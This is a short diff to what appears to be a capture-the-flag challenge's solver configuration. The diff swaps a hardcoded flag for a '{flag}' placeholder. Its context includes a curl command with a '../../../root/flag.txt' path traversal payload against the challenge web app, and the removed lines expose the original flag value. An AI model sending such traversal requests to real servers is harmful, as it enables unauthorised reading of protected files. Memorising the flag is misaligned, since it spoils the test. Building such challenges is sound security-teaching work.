@@ -25,10 +25,10 @@ solver:
     command: curl -s 'http://{target.webapp}/download?file=../../../root/flag.txt'
     expect: tr4v3rs3d
   - name: Verify complete flag
-    command: echo 'OCR{p4th_tr4v3rs3d}'
-    expect: OCR{p4th_tr4v3rs3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{p4th_tr4v3rs3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
